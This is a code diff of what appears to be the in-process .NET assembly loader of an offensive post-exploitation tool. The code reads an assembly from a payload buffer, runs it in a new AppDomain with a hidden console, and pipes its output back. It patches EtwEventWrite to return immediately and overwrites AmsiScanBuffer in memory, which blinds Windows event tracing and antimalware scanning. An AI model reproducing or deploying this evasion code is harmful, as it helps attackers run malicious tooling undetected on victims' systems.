@@ -19,18 +19,12 @@
 #define MethodJittingStarted 145
 #define ILStubGenerated 88
 
-bool amsiflag;
-bool etwflag;
-unsigned char signflag[1];
-
-char sig_40[] = { 0x76,0x34,0x2E,0x30,0x2E,0x33,0x30,0x33,0x31,0x39 };
-char sig_20[] = { 0x76,0x32,0x2E,0x30,0x2E,0x35,0x30,0x37,0x32,0x37 };
+#define ReportErrorThroughPipe(pipe, format, ...) {char buf[1024]; DWORD written; snprintf(buf, 1024, format, __VA_ARGS__); WriteFile(pipe, buf, (DWORD)strlen(buf), &written, NULL);}
 
 // mov rax, <Hooked function address>  
 // jmp rax
 unsigned char uHook[] = {
-	0x48, 0xb8, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-	0xFF, 0xE0
+	0xC3
 };
 
 #ifdef _X32
@@ -42,10 +36,17 @@ unsigned char amsipatch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
 SIZE_T patchsize = 6;
 #endif
 
-union PARAMSIZE {
-	unsigned char myByte[4];
-	int intvalue;
-} paramsize;
+struct Metadata
+{
+	unsigned int pipenameLength;
+	unsigned int appdomainLength;
+	unsigned int clrVersionLength;
+	unsigned int argsSize;
+	unsigned int assemblySize;
+	unsigned char amsiBypass;
+	unsigned char etwBypass;
+};
+DWORD METADATA_SIZE = 22;
 
 int executeSharp(LPVOID lpPayload)
 {
@@ -56,158 +57,179 @@ int executeSharp(LPVOID lpPayload)
 	BOOL bLoadable;
 	ICorRuntimeHost* pRuntimeHost = NULL;
 	IUnknownPtr pAppDomainThunk = NULL;
-	_AppDomainPtr pDefaultAppDomain = NULL;
+	_AppDomainPtr pCustomAppDomain = NULL;
+	IEnumUnknown* pEnumerator = NULL;
 	_AssemblyPtr pAssembly = NULL;
 	SAFEARRAYBOUND rgsabound[1];
-	SIZE_T readed;
 	_MethodInfoPtr pMethodInfo = NULL;
 	VARIANT retVal;
 	VARIANT obj;
-	SAFEARRAY *psaStaticMethodArgs;
+	SAFEARRAY* psaStaticMethodArgs;
+	SAFEARRAY* psaEntryPointParameters;
 	VARIANT vtPsa;
 
-	unsigned char pSize[8];
+	char* pipeName = NULL;
+	char* appdomainName = NULL;
+	char* clrVersion = NULL;
+	wchar_t* clrVersion_w = NULL;
+	BYTE* arg_s = NULL;
+	wchar_t* appdomainName_w = NULL;
 
-	//Read parameters assemblysize + argssize
-	ReadProcessMemory(GetCurrentProcess(), lpPayload, pSize, 8, &readed);
+	Metadata metadata;
 
-	PARAMSIZE assemblysize;
-	assemblysize.myByte[0] = pSize[0];
-	assemblysize.myByte[1] = pSize[1];
-	assemblysize.myByte[2] = pSize[2];
-	assemblysize.myByte[3] = pSize[3];
+	// Structure of lpPayload:
+	// - Packed metadata, including lengths of the following fields
+	// - Pipe name (ASCII)
+	// - Appdomain name (ASCII)
+	// - Clr Version Name (ASCII)
+	// - Param data
+	// - Assembly data
+	
+	memcpy(&metadata, lpPayload, METADATA_SIZE);
 
-	PARAMSIZE argssize;
-	argssize.myByte[0] = pSize[4];
-	argssize.myByte[1] = pSize[5];
-	argssize.myByte[2] = pSize[6];
-	argssize.myByte[3] = pSize[7];
+	BYTE* data_ptr = (BYTE*)lpPayload + METADATA_SIZE;
 
-	long raw_assembly_length = assemblysize.intvalue;
-	long raw_args_length = argssize.intvalue;
+	pipeName = (char*)malloc((metadata.pipenameLength + 1) * sizeof(char));
+	memcpy(pipeName, data_ptr, metadata.pipenameLength);
+	pipeName[metadata.pipenameLength] = 0; // Null-terminate
+	data_ptr += metadata.pipenameLength;
 
-	unsigned char *allData = (unsigned char*)malloc(raw_assembly_length * sizeof(unsigned char)+ raw_args_length * sizeof(unsigned char) + 9 * sizeof(unsigned char));
-	unsigned char *arg_s = (unsigned char*)malloc(raw_args_length * sizeof(unsigned char));
-	unsigned char *rawData = (unsigned char*)malloc(raw_assembly_length * sizeof(unsigned char));
+	appdomainName = (char*)malloc((metadata.appdomainLength + 1) * sizeof(char));
+	memcpy(appdomainName, data_ptr, metadata.appdomainLength);
+	appdomainName[metadata.appdomainLength] = 0; // Null-terminate
+	data_ptr += metadata.appdomainLength;
 
-	SecureZeroMemory(allData, raw_assembly_length * sizeof(unsigned char) + raw_args_length * sizeof(unsigned char) + 9 * sizeof(unsigned char));
-	SecureZeroMemory(arg_s, raw_args_length * sizeof(unsigned char));
-	SecureZeroMemory(rawData, raw_assembly_length * sizeof(unsigned char));
+	clrVersion = (char*)malloc((metadata.clrVersionLength + 1) * sizeof(char));
+	memcpy(clrVersion, data_ptr, metadata.clrVersionLength);
+	clrVersion[metadata.clrVersionLength] = 0; // Null-terminate
+	data_ptr += metadata.clrVersionLength;
 
-	rgsabound[0].cElements = raw_assembly_length;
+	// Convert to wchar
+	clrVersion_w = new wchar_t[metadata.clrVersionLength + 1];
+	mbstowcs(clrVersion_w, clrVersion, metadata.clrVersionLength + 1);
+	
+	arg_s = (unsigned char*)malloc(metadata.argsSize * sizeof(BYTE));;
+	memcpy(arg_s, data_ptr, metadata.argsSize);
+	data_ptr += metadata.argsSize;
+
+	////////////////// Hijack stdout
+
+	// Create a pipe to send data
+	HANDLE pipe = CreateNamedPipeA(
+		pipeName, // name of the pipe
+		PIPE_ACCESS_OUTBOUND, // 1-way pipe -- send only
+		PIPE_TYPE_BYTE, // send data as a message stream
+		1, // only allow 1 instance of this pipe
+		0, // no outbound buffer
+		0, // no inbound buffer
+		0, // use default wait time
+		NULL // use default security attributes
+	);
+
+	if (pipe == NULL || pipe == INVALID_HANDLE_VALUE) {
+		//printf("[CLRHOST] Failed to create outbound pipe instance.\n");
+		hr = -1;
+		goto Cleanup;
+	}
+
+	// This call blocks until a client process connects to the pipe
+	BOOL result = ConnectNamedPipe(pipe, NULL);
+	if (!result) {
+		//printf("[CLRHOST] Failed to make connection on named pipe.\n");
+		hr = -1;
+		goto Cleanup;
+	}
+
+	SetStdHandle(STD_OUTPUT_HANDLE, pipe);
+	SetStdHandle(STD_ERROR_HANDLE, pipe);
+
+	///////////////////// Done hijacking stdout
+
+	rgsabound[0].cElements = metadata.assemblySize;
 	rgsabound[0].lLbound = 0;
 	SAFEARRAY* pSafeArray = SafeArrayCreate(VT_UI1, 1, rgsabound);
 
 	void* pvData = NULL;
 	hr = SafeArrayAccessData(pSafeArray, &pvData);
-
+	
 	if (FAILED(hr))
 	{
-		printf("Failed SafeArrayAccessData w/hr 0x%08lx\n", hr);
-		return -1;
+		ReportErrorThroughPipe(pipe, "[CLRHOST] Failed SafeArrayAccessData w/hr 0x%08lx\n", hr);
+		goto Cleanup;
 	}
-	
-	//Reading memory parameters + amsiflag + args + assembly
-	ReadProcessMemory(GetCurrentProcess(), lpPayload , allData, raw_assembly_length + raw_args_length + 11, &readed);
 
-	//Taking pointer to amsi
-	unsigned char *offsetamsi = allData + 8;
-	//Store amsi flag 
-	amsiflag = (offsetamsi[0] != 0);
-
-	unsigned char *offsetetw = allData + 9;
-	//Store etw flag 
-	etwflag = (offsetamsi[0] != 0);
-
-	unsigned char *offsetsign = allData + 10;
-	//Store sihnature flag 
-	memcpy(signflag, offsetsign, 1);
-	
-	//Taking pointer to args
-	unsigned char *offsetargs = allData + 11;
-	//Store parameters 
-	memcpy(arg_s, offsetargs, raw_args_length);
-
-	//Taking pointer to assembly
-	unsigned char *offset = allData + raw_args_length + 11;
-	//Store assembly
-	memcpy(pvData, offset, raw_assembly_length);
-
-	LPCWSTR clrVersion;
-	
-	if(FindVersion(pvData, raw_assembly_length))
-	{
-		clrVersion = L"v4.0.30319";
-	}
-	else
-	{
-		clrVersion = L"v2.0.50727";
-	}
+	// Store assembly
+	memcpy(pvData, data_ptr, metadata.assemblySize);
 
 	hr = SafeArrayUnaccessData(pSafeArray);
 
 	if (FAILED(hr))
 	{
-		printf("Failed SafeArrayUnaccessData w/hr 0x%08lx\n", hr);
-		return -1;
+		ReportErrorThroughPipe(pipe, "[CLRHOST] Failed SafeArrayUnaccessData w/hr 0x%08lx\n", hr);
+		goto Cleanup;
 	}
 
-	//Etw bypass
-	if (etwflag)
+	// Etw bypass
+	if (metadata.etwBypass)
 	{
-		int ptcResult = PatchEtw();
+		int ptcResult = PatchEtw(pipe);
 		if (ptcResult == -1)
 		{
-			wprintf(L"Etw bypass failed\n");
-			return -1;
+			ReportErrorThroughPipe(pipe, "[CLRHOST] Etw bypass failed\n");
+			goto Cleanup;
 		}
 	}
-
+	HMODULE hMscoree = LoadLibrary("mscoree.dll");
+	FARPROC clrCreateInstance = GetProcAddress(hMscoree, "CLRCreateInstance");
+	if (clrCreateInstance == NULL)
+	{
+		ReportErrorThroughPipe(pipe, "[CLRHOST] CLRCreateInstance not present on this system.\n");
+		goto Cleanup;
+	}
 	hr = CLRCreateInstance(CLSID_CLRMetaHost, IID_ICLRMetaHost, (VOID**)&pMetaHost);
 
-	if(FAILED(hr))
+	if (FAILED(hr))
 	{
-		printf("CLRCreateInstance failed w/hr 0x%08lx\n", hr);
-		return -1;
+		ReportErrorThroughPipe(pipe, "[CLRHOST] CLRCreateInstance failed w/hr 0x%08lx\n", hr);
+		goto Cleanup;
 	}
 
-	IEnumUnknown* pEnumerator;
 	HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, GetCurrentProcessId());
 	hr = pMetaHost->EnumerateLoadedRuntimes(hProcess, &pEnumerator);
 
 	if (FAILED(hr))
 	{
-		printf("Cannot enumerate loaded runtime w/hr 0x%08lx\n", hr);
-		return -1;
+		ReportErrorThroughPipe(pipe, "[CLRHOST] Cannot enumerate loaded runtime w/hr 0x%08lx\n", hr);
+		goto Cleanup;
 	}
-	
-	BOOL isloaded = ClrIsLoaded(clrVersion, pEnumerator, (VOID**)&pRuntimeInfo);
 
-	if(!isloaded)
+	BOOL isloaded = ClrIsLoaded(clrVersion_w, pEnumerator, (VOID**)&pRuntimeInfo);
+
+	if (!isloaded)
 	{
-		hr = pMetaHost->GetRuntime(clrVersion, IID_ICLRRuntimeInfo, (VOID**)&pRuntimeInfo);
+		hr = pMetaHost->GetRuntime(clrVersion_w, IID_ICLRRuntimeInfo, (VOID**)&pRuntimeInfo);
 
 		if (FAILED(hr))
 		{
-			wprintf(L"Cannot get the required CLR version (%s) w/hr 0x%08lx\n", clrVersion, hr);
-			return -1;
+			ReportErrorThroughPipe(pipe, "[CLRHOST] Cannot get the required CLR version (%s) w/hr 0x%08lx\n", clrVersion, hr);
+			goto Cleanup;
 		}
 
 		hr = pRuntimeInfo->IsLoadable(&bLoadable);
 
 		if (FAILED(hr) || !bLoadable)
 		{
-			wprintf(L"Cannot load the required CLR version (%s) w/hr 0x%08lx\n", clrVersion, hr);
-			return -1;
+			ReportErrorThroughPipe(pipe, "[CLRHOST] Cannot load the required CLR version (%s) w/hr 0x%08lx\n", clrVersion, hr);
+			goto Cleanup;
 		}
 	}
 
 	hr = pRuntimeInfo->GetInterface(CLSID_CorRuntimeHost, IID_ICorRuntimeHost, (VOID**)&pRuntimeHost);
 
-	if(FAILED(hr))
+	if (FAILED(hr))
 	{
-		printf("ICLRRuntimeInfo::GetInterface failed w/hr 0x%08lx\n", hr);
-		return -1;
+		ReportErrorThroughPipe(pipe, "[CLRHOST] ICLRRuntimeInfo::GetInterface failed w/hr 0x%08lx\n", hr);
+		goto Cleanup;
 	}
 
 	if (!isloaded)
@@ -215,185 +237,227 @@ int executeSharp(LPVOID lpPayload)
 		hr = pRuntimeHost->Start();
 	}
 
-	if(FAILED(hr))
+	if (FAILED(hr))
 	{
-		printf("CLR failed to start w/hr 0x%08lx\n", hr);
-		return -1;
+		ReportErrorThroughPipe(pipe, "[CLRHOST] CLR failed to start w/hr 0x%08lx\n", hr);
+		goto Cleanup;
 	}
 
-	hr = pRuntimeHost->GetDefaultDomain(&pAppDomainThunk);
+	// Convert to wchar
+	appdomainName_w = new wchar_t[metadata.appdomainLength+1];
+	mbstowcs(appdomainName_w, appdomainName, metadata.appdomainLength+1);
 
-	if(FAILED(hr))
+	hr = pRuntimeHost->CreateDomain(appdomainName_w, NULL, &pAppDomainThunk);
+
+	if (FAILED(hr))
 	{
-		printf("ICorRuntimeHost::GetDefaultDomain failed w/hr 0x%08lx\n", hr);
-		return -1;
+		ReportErrorThroughPipe(pipe, "[CLRHOST] ICorRuntimeHost::CreateDomain failed w/hr 0x%08lx\n", hr);
+		goto Cleanup;
 	}
 
-	hr = pAppDomainThunk->QueryInterface(__uuidof(_AppDomain), (VOID**) &pDefaultAppDomain);
+	hr = pAppDomainThunk->QueryInterface(__uuidof(_AppDomain), (VOID**)&pCustomAppDomain);
 
-	if(FAILED(hr))
+	if (FAILED(hr))
 	{
-		printf("Failed to get default AppDomain w/hr 0x%08lx\n", hr);
-		return -1;
+		ReportErrorThroughPipe(pipe, "[CLRHOST] Failed to get default AppDomain w/hr 0x%08lx\n", hr);
+		goto Cleanup;
 	}
 
-	//Amsi bypass
-	if (amsiflag)
+	// Amsi bypass
+	if (metadata.amsiBypass)
 	{
-		int ptcResult = PatchAmsi();
+		int ptcResult = PatchAmsi(pipe);
 		if (ptcResult == -1)
 		{
-			printf("Amsi bypass failed\n");
-			return -1;
+			ReportErrorThroughPipe(pipe, "[CLRHOST] Amsi bypass failed\n");
+			goto Cleanup;
 		}
 	}
 
-	hr = pDefaultAppDomain->Load_3(pSafeArray, &pAssembly);
+	hr = pCustomAppDomain->Load_3(pSafeArray, &pAssembly);
 
-	if(FAILED(hr))
+	if (FAILED(hr))
 	{
-		printf("Failed pDefaultAppDomain->Load_3 w/hr 0x%08lx\n", hr);
-		return -1;
+		ReportErrorThroughPipe(pipe, "[CLRHOST] Failed pCustomAppDomain->Load_3 w/hr 0x%08lx\n", hr);
+		goto Cleanup;
 	}
 
 	hr = pAssembly->get_EntryPoint(&pMethodInfo);
 
-	if(FAILED(hr))
+	if (FAILED(hr))
 	{
-		printf("Failed pAssembly->get_EntryPoint w/hr 0x%08lx\n", hr);
-		return -1;
+		ReportErrorThroughPipe(pipe, "[CLRHOST] Failed pAssembly->get_EntryPoint w/hr 0x%08lx\n", hr);
+		goto Cleanup;
+	}
+
+	// Let's check the number of parameters: must be either the 0-arg Main(), or a 1-arg Main(string[])
+	pMethodInfo->GetParameters(&psaEntryPointParameters);
+	hr = SafeArrayLock(psaEntryPointParameters);
+	if (!SUCCEEDED(hr))
+	{
+		ReportErrorThroughPipe(pipe, "[CLRHOST] Failed to lock param array w/hr 0x%08lx\n", hr);
+		goto Cleanup;
+	}
+	long uBound, lBound;
+	SafeArrayGetLBound(psaEntryPointParameters, 1, &lBound);
+	SafeArrayGetUBound(psaEntryPointParameters, 1, &uBound);
+	long numArgs = uBound - lBound + 1;
+	hr = SafeArrayUnlock(psaEntryPointParameters);
+	if (!SUCCEEDED(hr))
+	{
+		ReportErrorThroughPipe(pipe, "[CLRHOST] Failed to unlock param array w/hr 0x%08lx\n", hr);
+		goto Cleanup;
 	}
 
 	ZeroMemory(&retVal, sizeof(VARIANT));
 	ZeroMemory(&obj, sizeof(VARIANT));
-	
+
 	obj.vt = VT_NULL;
 	vtPsa.vt = (VT_ARRAY | VT_BSTR);
 
-	//Managing parameters
-	if(signflag[0] == '\x02')
+	switch (numArgs)
 	{
-		//if we have at least 1 parameter set cEleemnt to 1
+	case 0:
+		if (metadata.argsSize > 1) // There is always a Null byte at least, so "1" in size means "0 args"
+		{
+			ReportErrorThroughPipe(pipe, "[CLRHOST] Assembly takes no arguments, but some were provided\n");
+			goto Cleanup;
+		}
+		// If no parameters set cElement to 0
+		psaStaticMethodArgs = SafeArrayCreateVector(VT_VARIANT, 0, 0);
+		break;
+	case 1:
+	{
+		// If we have at least 1 parameter set cElement to 1
 		psaStaticMethodArgs = SafeArrayCreateVector(VT_VARIANT, 0, 1);
 
-		LPWSTR *szArglist;
-		int nArgs;
-		wchar_t *wtext = (wchar_t *)malloc((sizeof(wchar_t) * raw_args_length));
+		// Here we unfortunately need to do a trick. CommandLineToArgvW treats the first argument differently, as
+		// it expects it to be a filename. This affects situations where the first argument contains backslashes,
+		// or if there are no arguments at all (it will just create one - the process's image name).
+		// To coerce it into performing the correct data transformation, we create a fake first parameter, and then
+		// ignore it in the output.
 
-		mbstowcs(wtext, (char *)arg_s, raw_args_length);
+		LPWSTR* szArglist;
+		int nArgs;
+		wchar_t* wtext = (wchar_t*)malloc((sizeof(wchar_t) * (metadata.argsSize + 2)));
+		wtext[0] = L'X'; // Fake process name
+		wtext[1] = L' '; // Separator
+
+
+		mbstowcs(wtext+2, (char*)arg_s, metadata.argsSize);
 		szArglist = CommandLineToArgvW(wtext, &nArgs);
 
 		free(wtext);
 
-		vtPsa.parray = SafeArrayCreateVector(VT_BSTR, 0, nArgs);
+		vtPsa.parray = SafeArrayCreateVector(VT_BSTR, 0, nArgs - 1); // Subtract 1, to ignore the fake process name
 
-		for(long i = 0;i< nArgs;i++)
+		for (long i = 1; i < nArgs; i++) // Start a 1 - ignoring the fake process name
 		{
 			size_t converted;
 			size_t strlength = wcslen(szArglist[i]) + 1;
-			OLECHAR *sOleText1 = new OLECHAR[strlength];
-			char * buffer = (char *)malloc(strlength * sizeof(char));
-			
+			OLECHAR* sOleText1 = new OLECHAR[strlength];
+			char* buffer = (char*)malloc(strlength * sizeof(char));
+
 			wcstombs(buffer, szArglist[i], strlength);
-			
+
 			mbstowcs_s(&converted, sOleText1, strlength, buffer, strlength);
 			BSTR strParam1 = SysAllocString(sOleText1);
-
-			SafeArrayPutElement(vtPsa.parray, &i, strParam1);
+			long actualPosition = i - 1;
+			SafeArrayPutElement(vtPsa.parray, &actualPosition, strParam1);
 			free(buffer);
 		}
 
+		LocalFree(szArglist);
+
 		long iEventCdIdx(0);
 		hr = SafeArrayPutElement(psaStaticMethodArgs, &iEventCdIdx, &vtPsa);
+		break;
 	}
-	else
-	{
-		//if no parameters set cEleemnt to 0
-		psaStaticMethodArgs = SafeArrayCreateVector(VT_VARIANT, 0, 0);
+	default:
+		ReportErrorThroughPipe(pipe, "[CLRHOST] Unexpected argument length: %d\n", numArgs);
+		goto Cleanup;
 	}
-	
+
 	//Assembly execution
 	hr = pMethodInfo->Invoke_3(obj, psaStaticMethodArgs, &retVal);
-
-	if(FAILED(hr))
+	if (FAILED(hr))
 	{
-		printf("Failed pMethodInfo->Invoke_3  w/hr 0x%08lx\n", hr);
-		return -1;
+		ReportErrorThroughPipe(pipe, "[CLRHOST] Unhandled exception when running assembly w/hr 0x%08lx\n", hr);
+		goto Cleanup;
 	}
 
-	wprintf(L"Succeeded\n");
-	
-	return 0;
+Cleanup:
+
+	FlushFileBuffers(pipe);
+	DisconnectNamedPipe(pipe);
+	CloseHandle(pipe);
+
+	if (pEnumerator) {
+		pEnumerator->Release();
+	}
+	if (pMetaHost) {
+		pMetaHost->Release();
+	}
+	if (pRuntimeInfo) {
+		pRuntimeInfo->Release();
+	}
+
+	if (pRuntimeHost) {
+		if (pCustomAppDomain) {
+			pRuntimeHost->UnloadDomain(pCustomAppDomain);
+		}
+		pRuntimeHost->Release();
+	}
+
+	if (psaStaticMethodArgs) {
+		SafeArrayDestroy(psaStaticMethodArgs);
+	}
+	if (pSafeArray) {
+		SafeArrayDestroy(pSafeArray);
+	}
+
+	if (appdomainName) {
+		free(appdomainName);
+	}
+
+	if (clrVersion) {
+		free(clrVersion);
+	}
+	if (clrVersion_w) {
+		delete[] clrVersion_w;
+	}
+
+	if (arg_s) {
+		free(arg_s);
+	}
+
+	if (appdomainName_w) {
+		delete[] appdomainName_w;
+	}
+
+	return hr;
 }
 
 VOID Execute(LPVOID lpPayload)
 {
-	if (!AttachConsole(-1))
+	// Attach or create console
+	if (GetConsoleWindow() == NULL) {
 		AllocConsole();
+		HWND wnd = GetConsoleWindow();
+		if (wnd)
+			ShowWindow(wnd, SW_HIDE);
+	}
 
-	executeSharp(lpPayload);
-
-}
-
-BOOL FindVersion(void * assembly, int length)
-{
-	char* assembly_c;
-	assembly_c = (char*)assembly;
+	HANDLE stdOut = GetStdHandle(STD_OUTPUT_HANDLE);
+	HANDLE stdErr = GetStdHandle(STD_ERROR_HANDLE);
 	
-	for (int i = 0; i < length; i++)
-	{
-		for (int j = 0; j < 10; j++)
-		{
-			if (sig_40[j] != assembly_c[i + j])
-			{
-				break;
-			}
-			else
-			{
-				if (j == (9))
-				{
-					return TRUE;
-				}
-			}
-		}
-	}
+	executeSharp(lpPayload);
+	SetStdHandle(STD_OUTPUT_HANDLE, stdOut);
+	SetStdHandle(STD_ERROR_HANDLE, stdErr);
 
-	return FALSE;
 }
 
-ULONG NTAPI MyEtwEventWrite(
-	__in REGHANDLE RegHandle,
-	__in PCEVENT_DESCRIPTOR EventDescriptor,
-	__in ULONG UserDataCount,
-	__in_ecount_opt(UserDataCount) PEVENT_DATA_DESCRIPTOR UserData)
-{
-	ULONG uResult = 0;
-
-	_EtwEventWriteFull EtwEventWriteFull = (_EtwEventWriteFull)
-		GetProcAddress(GetModuleHandle("ntdll.dll"), "EtwEventWriteFull");
-	if (EtwEventWriteFull == NULL) {
-		return 1;
-	}
-
-	switch (EventDescriptor->Id) {
-	case AssemblyDCStart_V1:
-		// Block CLR assembly loading events.
-		break;
-	case MethodLoadVerbose_V1:
-		// Block CLR method loading events.
-		break;
-	case ILStubGenerated:
-		// Block MSIL stub generation events.
-		break;
-	default:
-		// Forward all other ETW events using EtwEventWriteFull.
-		uResult = EtwEventWriteFull(RegHandle, EventDescriptor, 0, NULL, NULL, UserDataCount, UserData);
-	}
-
-	return uResult;
-}
-
-INT InlinePatch(LPVOID lpFuncAddress, UCHAR * patch, int patchsize) {
+INT InlinePatch(LPVOID lpFuncAddress, UCHAR* patch, int patchsize) {
 	PNT_TIB pTIB = NULL;
 	PTEB pTEB = NULL;
 	PPEB pPEB = NULL;
@@ -450,55 +514,52 @@ INT InlinePatch(LPVOID lpFuncAddress, UCHAR * patch, int patchsize) {
 	return 0;
 }
 
-BOOL PatchEtw()
+BOOL PatchEtw(HANDLE pipe)
 {
 	HMODULE lib = LoadLibraryA("ntdll.dll");
 	if (lib == NULL)
 	{
-		wprintf(L"Cannot load ntdll.dll");
+		ReportErrorThroughPipe(pipe, "[CLRHOST] Cannot load ntdll.dll");
 		return -2;
 	}
 	LPVOID lpFuncAddress = GetProcAddress(lib, "EtwEventWrite");
 	if (lpFuncAddress == NULL)
 	{
-		wprintf(L"Cannot get address of EtwEventWrite");
+		ReportErrorThroughPipe(pipe, "[CLRHOST] Cannot get address of EtwEventWrite");
 		return -2;
 	}
 
-	// Add address of hook function to patch.
-	*(DWORD64*)&uHook[2] = (DWORD64)MyEtwEventWrite;
-
-	return InlinePatch(lpFuncAddress, uHook,sizeof(uHook));
+	return InlinePatch(lpFuncAddress, uHook, sizeof(uHook));
 }
 
-BOOL PatchAmsi()
+BOOL PatchAmsi(HANDLE pipe)
 {
 
 	HMODULE lib = LoadLibraryA("amsi.dll");
 	if (lib == NULL)
 	{
-		printf("Cannot load amsi.dll");
+		ReportErrorThroughPipe(pipe, "[CLRHOST] Cannot load amsi.dll");
 		return -2;
 	}
 
 	LPVOID addr = GetProcAddress(lib, "AmsiScanBuffer");
-	if(addr == NULL)
+	if (addr == NULL)
 	{
-		printf("Cannot get address of AmsiScanBuffer");
+		ReportErrorThroughPipe(pipe, "[CLRHOST] Cannot get address of AmsiScanBuffer");
 		return -2;
 	}
 
 	return InlinePatch(addr, amsipatch, sizeof(amsipatch));
 }
 
-BOOL ClrIsLoaded(LPCWSTR version, IEnumUnknown* pEnumerator, LPVOID * pRuntimeInfo) {
+BOOL ClrIsLoaded(LPCWSTR version, IEnumUnknown* pEnumerator, LPVOID* pRuntimeInfo) {
 	HRESULT hr;
 	ULONG fetched = 0;
 	DWORD vbSize;
 	BOOL retval = FALSE;
 	wchar_t currentversion[260];
 
-	while (SUCCEEDED(pEnumerator->Next(1, (IUnknown **)&pRuntimeInfo, &fetched)) && fetched > 0) 
+	while (SUCCEEDED(pEnumerator->Next(1, (IUnknown**)&pRuntimeInfo, &fetched)) && fetched > 0)
 	{
 		hr = ((ICLRRuntimeInfo*)pRuntimeInfo)->GetVersionString(currentversion, &vbSize);
 		if (!FAILED(hr))
@@ -509,11 +570,8 @@ BOOL ClrIsLoaded(LPCWSTR version, IEnumUnknown* pEnumerator, LPVOID * pRuntimeIn
 				break;
 			}
 		}
+		((ICLRRuntimeInfo*)pRuntimeInfo)->Release();
 	}
 
 	return retval;
 }
-
-
-
-
